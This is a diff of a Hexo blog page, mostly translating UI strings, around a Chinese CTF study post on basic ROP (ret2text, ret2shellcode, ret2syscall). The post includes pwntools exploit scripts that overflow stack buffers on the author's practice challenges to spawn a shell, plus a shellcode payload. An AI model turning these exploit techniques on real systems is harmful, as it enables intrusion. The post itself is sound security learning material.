@@ -62,27 +62,27 @@
   </h1>
   
 <div class="meta">
-  <span class="item" title="作成日：2022-12-15 21:12:06">
+  <span class="item" title="Created: 2022-12-15 21:12:06">
     <span class="icon">
       <i class="ic i-calendar"></i>
     </span>
-    <span class="text">投稿日</span>
+    <span class="text">Posted on</span>
     <time itemprop="dateCreated datePublished" datetime="2022-12-15T21:12:06+08:00">2022-12-15</time>
   </span>
-  <span class="item" title="単語数">
+  <span class="item" title="Symbols count in article">
     <span class="icon">
       <i class="ic i-pen"></i>
     </span>
-    <span class="text">単語数</span>
+    <span class="text">Symbols count in article</span>
     <span>2.3k</span>
-    <span class="text">単語</span>
+    <span class="text">words</span>
   </span>
-  <span class="item" title="読書の時間">
+  <span class="item" title="Reading time">
     <span class="icon">
       <i class="ic i-clock"></i>
     </span>
-    <span class="text">読書の時間</span>
-    <span>2 分</span>
+    <span class="text">Reading time</span>
+    <span>2 mins.</span>
   </span>
 </div>
 
@@ -92,7 +92,7 @@
         <nav id="nav">
   <div class="inner">
     <div class="toggle">
-      <div class="lines" aria-label="ナビゲーションバーの切り替え">
+      <div class="lines" aria-label="Toggle navigation bar">
         <span class="line"></span>
         <span class="line"></span>
         <span class="line"></span>
@@ -138,7 +138,7 @@
     
 <div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
 <i class="ic i-home"></i>
-<span><a href="/">ホーム</a></span>
+<span><a href="/">Home</a></span>
 </div>
 
     <article itemscope itemtype="http://schema.org/Article" class="post block" lang="default">
@@ -158,7 +158,7 @@
     
 
     <p>用 p64 () 发送数据时，是发送的字节流，也就是比特流（二进制流）。</p>
-<h1 id="基本-rop学习"><a class="sky" href="#基本-rop学习">#</a> 基本 ROP 学习</h1>
+<h1 id="基本-rop学习"><a class="markdownIt-Anchor" href="#基本-rop学习">#</a> 基本 ROP 学习</h1>
 <p>背景：NX 保护的开启 (No-eXecute, 不可执行保护）</p>
 <p>核心思想：栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
 <p>ROP 攻击一般得满足如下条件:</p>
@@ -168,11 +168,11 @@
 </li>
 <li>
 <p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>
-<h2 id="ret2text"><a class="sky" href="#ret2text">#</a> ret2text</h2>
+<h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text">#</a> ret2text</h2>
 </li>
 </ul>
 <p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p>
-<h3 id="pwn1_1"><a class="sky" href="#pwn1_1">#</a> pwn1_1</h3>
+<h3 id="pwn1_1"><a class="markdownIt-Anchor" href="#pwn1_1">#</a> pwn1_1</h3>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221220132950.png" alt="image.png"></p>
 <p>只开了 nx 保护</p>
 <p><code>read()</code>  函数读的数据长度比输入的字符 <code>&amp;buf</code>  的长度长，能够造成溢出</p>
@@ -183,9 +183,9 @@
 <p>用返回地址减去起始地址求得偏移量，这里 buf 相对于返回地址得偏移量为 0x18</p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221220135857.png" alt="image.png"></p>
 <p>exp 直通后门</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;gxh191.top&quot;</span>,<span class="number">25537</span>)</span><br><span class="line">sh_addr=<span class="number">0x40119E</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(sh_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><br>
-<img data-src="/images/QQ%E5%9B%BE%E7%89%8720221215212337.png" alt="image.png"></p>
-<h3 id="pwn2_1"><a class="sky" href="#pwn2_1">#</a> pwn2_1</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&quot;gxh191.top&quot;</span>,<span class="number">25537</span>)</span><br><span class="line">sh_addr=<span class="number">0x40119E</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(sh_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221215212337.png" alt="image.png"></p>
+<h3 id="pwn2_1"><a class="markdownIt-Anchor" href="#pwn2_1">#</a> pwn2_1</h3>
 <p>先 checksec 查看保护  只开了 nx 保护<br>
 <img data-src="/images/QQ%E5%9B%BE%E7%89%8720221215212443.png" alt="image.png"></p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221215212710.png" alt="image.png"></p>
@@ -197,10 +197,10 @@
 <img data-src="/images/QQ%E5%9B%BE%E7%89%8720221215212857.png" alt="image.png"><br>
  直接跳转到 b4ckd00r 函数会退出运行。因此 2-1 并不能像 1-1 一样直接跳转到 b4ckd00r 就行了 而是需要通过栈溢出跳转到 path<br>
  脚本如下</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;gxh191.top&#x27;</span>, <span class="number">25540</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4011EF</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<h2 id="ret2shellcode"><a class="sky" href="#ret2shellcode">#</a> ret2shellcode</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;gxh191.top&#x27;</span>, <span class="number">25540</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4011EF</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode">#</a> ret2shellcode</h2>
 <p>ret2shellcode，即控制程序执行 shellcode 代码。</p>
-<h3 id="pwn2_2"><a class="sky" href="#pwn2_2">#</a> pwn2_2</h3>
+<h3 id="pwn2_2"><a class="markdownIt-Anchor" href="#pwn2_2">#</a> pwn2_2</h3>
 <p>checksec 查看保护</p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221220132950.png" alt="image.png"></p>
 <p>典中典之 NX</p>
@@ -211,12 +211,12 @@
 <p>发现 mprotect 函数修改了 phone_number bss 段的权限</p>
 <p>第三个参数为 7 表示<strong>可读可写可执行</strong></p>
 <p>即思路是将 shellcode 写入 phone_number bss 段 再通过栈溢出来执行</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;gxh191.top&#x27;</span>, <span class="number">25542</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x4040A0</span>+<span class="number">0x18</span>)+p64(<span class="number">0x4040A0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ber:&#x27;</span>,shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;uf:&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
-<h2 id="ret2syscall"><a class="sky" href="#ret2syscall">#</a> ret2syscall</h2>
-<h3 id="原理"><a class="sky" href="#原理">#</a> 原理</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;gxh191.top&#x27;</span>, <span class="number">25542</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x4040A0</span>+<span class="number">0x18</span>)+p64(<span class="number">0x4040A0</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ber:&#x27;</span>,shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;uf:&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall">#</a> ret2syscall</h2>
+<h3 id="原理"><a class="markdownIt-Anchor" href="#原理">#</a> 原理</h3>
 <p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
 <p>pop eax 将栈顶数据弹到 eax 里面</p>
-<h4 id="以ctfwiki上的例子做一下"><a class="sky" href="#以ctfwiki上的例子做一下">#</a> 以 ctfwiki 上的例子做一下</h4>
+<h4 id="以ctfwiki上的例子做一下"><a class="markdownIt-Anchor" href="#以ctfwiki上的例子做一下">#</a> 以 ctfwiki 上的例子做一下</h4>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227152927.png" alt="image.png"></p>
 <p>NX 保护</p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227152726.png" alt="image.png"></p>
@@ -224,11 +224,11 @@
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227153509.png" alt="image.png"></p>
 <p>得偏移量 112</p>
 <p>应用程序调用系统调用的过程是：</p>
-<p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把系统调用的编号存入 EAX；</span><br><span class="line">把函数参数存入其它通用寄存器；</span><br><span class="line">触发 0x80 号中断（int 0x80）。</span><br><span class="line">[sys_execve系统调用号是11也就是0xb]</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把系统调用的编号存入 EAX；</span><br><span class="line">把函数参数存入其它通用寄存器；</span><br><span class="line">触发 0x80 号中断（int 0x80）。</span><br><span class="line">[sys_execve系统调用号是11也就是0xb]</span><br></pre></td></tr></table></figure>
 <p><strong>Syscall 的函数调用规范为</strong>： <code>execve(“/bin/sh”, 0,0)</code> ;</p>
 <p>所以，<strong>eax</strong> = 0xb | <strong>ebx</strong> = address of ‘/bin/sh’ | <strong>ecx</strong> = 0 | <strong>edx</strong> = 0</p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227153810.png" alt="image.png"></p>
-<p>payload=b'a'*112+p32(pop_rax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)</p>
+<p>payload=b’a’*112+p32(pop_rax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)</p>
 <p>用 ROPgadget 获取一些命令片段的地址</p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227154902.png" alt="image.png"></p>
 <p>先找 eax</p>
@@ -236,7 +236,7 @@
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227155404.png" alt="image.png"></p>
 <p><code>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</code></p>
 <p>可以用 3 个寄存器都有了</p>
-<p>再找 '/bin/sh' 字符串和 int 0x80</p>
+<p>再找’/bin/sh’字符串和 int 0x80</p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227155727.png" alt="image.png"></p>
 <p><img data-src="/images/QQ%E5%9B%BE%E7%89%8720221227155827.png" alt="image.png"></p>
 <p>都找到了 可以写 exp 了</p>
@@ -254,16 +254,16 @@
     <span class="icon">
       <i class="ic i-calendar-check"></i>
     </span>
-    <span class="text">編集日</span>
-    <time title="修正日：2023-01-11 17:16:19" itemprop="dateModified" datetime="2023-01-11T17:16:19+08:00">2023-01-11</time>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2023-01-11 17:16:19" itemprop="dateModified" datetime="2023-01-11T17:16:19+08:00">2023-01-11</time>
   </span>
-  <span id="2022/12/15/基本ROP学习/" class="item leancloud_visitors" data-flag-title="基本ROP学习" title="閲覧数">
+  <span id="2022/12/15/基本ROP学习/" class="item leancloud_visitors" data-flag-title="基本ROP学习" title="Views">
       <span class="icon">
         <i class="ic i-eye"></i>
       </span>
-      <span class="text">閲覧数</span>
+      <span class="text">Views</span>
       <span class="leancloud-visitors-count"></span>
-      <span class="text">回</span>
+      <span class="text">times</span>
   </span>
 </div>
 
@@ -272,14 +272,14 @@
 <div id="copyright">
 <ul>
   <li class="author">
-    <strong>著者： </strong>sky <i class="ic i-at"><em>@</em></i>skyの博客
+    <strong>Post author:  </strong>sky <i class="ic i-at"><em>@</em></i>skyの博客
   </li>
   <li class="link">
-    <strong>記事へのリンク：</strong>
+    <strong>Post link: </strong>
     <a href="https://3cly.github.io/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/" title="基本ROP学习">https://3cly.github.io/2022/12/15/基本ROP学习/</a>
   </li>
   <li class="license">
-    <strong>著作権表示： </strong>このブログ内のすべての記事は、特別な記載がない限り <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> の下のライセンスで保護されています。
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
   </li>
 </ul>
 </div>
@@ -296,7 +296,7 @@
       
 
   <a href="/2022/12/15/%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/" itemprop="url" rel="prev" data-background-image="&#x2F;2022&#x2F;12&#x2F;15&#x2F;%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B&#x2F;102734382_p0.jpg" title="搭建过程">
-  <span class="type">前の記事</span>
+  <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>搭建过程</h3>
   </a>
@@ -306,7 +306,7 @@
       
 
   <a href="/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/" itemprop="url" rel="next" data-background-image="&#x2F;2022&#x2F;12&#x2F;30&#x2F;%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D&#x2F;102577650_p0.jpg" title="PLT表与GOT表の延迟绑定机制学习">
-  <span class="type">次の記事</span>
+  <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>PLT表与GOT表の延迟绑定机制学习</h3>
   </a>
@@ -326,12 +326,12 @@
 
   <div class="panels">
     <div class="inner">
-      <div class="contents panel pjax" data-title="見出し">
+      <div class="contents panel pjax" data-title="Contents">
           <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC-rop%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text"> 基本 ROP 学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-number">1.1.</span> <span class="toc-text"> ret2text</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1_1"><span class="toc-number">1.1.1.</span> <span class="toc-text"> pwn1_1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2_1"><span class="toc-number">1.1.2.</span> <span class="toc-text"> pwn2_1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">1.2.</span> <span class="toc-text"> ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn2_2"><span class="toc-number">1.2.1.</span> <span class="toc-text"> pwn2_2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-number">1.3.</span> <span class="toc-text"> ret2syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A5ctfwiki%E4%B8%8A%E7%9A%84%E4%BE%8B%E5%AD%90%E5%81%9A%E4%B8%80%E4%B8%8B"><span class="toc-number">1.3.1.1.</span> <span class="toc-text"> 以 ctfwiki 上的例子做一下</span></a></li></ol></li></ol></li></ol></li></ol>
       </div>
-      <div class="related panel pjax" data-title="関連記事">
+      <div class="related panel pjax" data-title="Related">
       </div>
-      <div class="overview panel" data-title="概要">
+      <div class="overview panel" data-title="Overview">
         <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
   <img class="image" itemprop="image" alt="sky"
       data-src="/images/avatar.png">
@@ -343,7 +343,7 @@
     <div class="item posts">
       <a href="/archives/">
         <span class="count">5</span>
-        <span class="name">ポスト</span>
+        <span class="name">posts</span>
       </a>
     </div>
 </nav>
@@ -355,7 +355,7 @@
   
     
   <li class="item">
-    <a href="/" rel="section"><i class="ic i-home"></i>ホーム</a>
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
   </li>
 
 
@@ -367,12 +367,12 @@
 
   <ul id="quick">
     <li class="prev pjax">
-        <a href="/2022/12/15/%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/" rel="prev" title="前の記事"><i class="ic i-chevron-left"></i></a>
+        <a href="/2022/12/15/%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
-        <a href="/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/" rel="next" title="次の記事"><i class="ic i-chevron-right"></i></a>
+        <a href="/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -388,7 +388,7 @@
         <div class="widgets">
           
 <div class="rpost pjax">
-  <h2>ランダムな記事</h2>
+  <h2>Random Posts</h2>
   <ul>
       
   <li class="item">
@@ -397,15 +397,6 @@
 </div>
 
     <span><a href="/2022/12/14/%E5%8D%9A%E5%AE%A2%E7%AE%80%E4%BB%8B/" title="博客简介">博客简介</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2022/12/15/%E9%9A%8F%E7%AC%94/" title="以前的杂记">以前的杂记</a></span>
   </li>
 
       
@@ -423,7 +414,7 @@
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/" title="基本ROP学习">基本ROP学习</a></span>
+    <span><a href="/2022/12/15/%E9%9A%8F%E7%AC%94/" title="以前的杂记">以前的杂记</a></span>
   </li>
 
       
@@ -435,10 +426,19 @@
     <span><a href="/2022/12/30/%E2%80%9CPLT%E8%A1%A8%E4%B8%8EGOT%E8%A1%A8%E3%81%AE%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E2%80%9D/" title="PLT表与GOT表の延迟绑定机制学习">PLT表与GOT表の延迟绑定机制学习</a></span>
   </li>
 
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/12/15/%E5%9F%BA%E6%9C%ACROP%E5%AD%A6%E4%B9%A0/" title="基本ROP学习">基本ROP学习</a></span>
+  </li>
+
   </ul>
 </div>
 <div>
-  <h2>最近のコメント</h2>
+  <h2>Recent Comments</h2>
   <ul class="leancloud-recent-comment"></ul>
 </div>
 
@@ -457,13 +457,13 @@
     <span class="post-meta-item-icon">
       <i class="ic i-chart-area"></i>
     </span>
-    <span title="単語の総数">7k 単語</span>
+    <span title="Symbols count total">7k words</span>
 
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="ic i-coffee"></i>
     </span>
-    <span title="読書の合計時間">6 分</span>
+    <span title="Reading time total">6 mins.</span>
   </div>
   <div class="powered-by">
     Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
@@ -477,16 +477,16 @@
   var LOCAL = {
     path: '2022/12/15/基本ROP学习/',
     favicon: {
-      show: "（●´3｀●）やれやれだぜ",
-      hide: "(´Д｀)大変だ！"
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
     },
     search : {
-      placeholder: "検索…",
-      empty: "「 ${query} 」については何も見つかりませんでした",
-      stats: "${time} ms以内に ${hits} 件の結果が見つかりました"
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
     },
     valine: true,fancybox: true,
-    copyright: 'コピーは成功しました。 <br> 再印刷については、 ％s 契約に従ってください。',
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
     ignores : [
       function(uri) {
         return uri.includes('#');
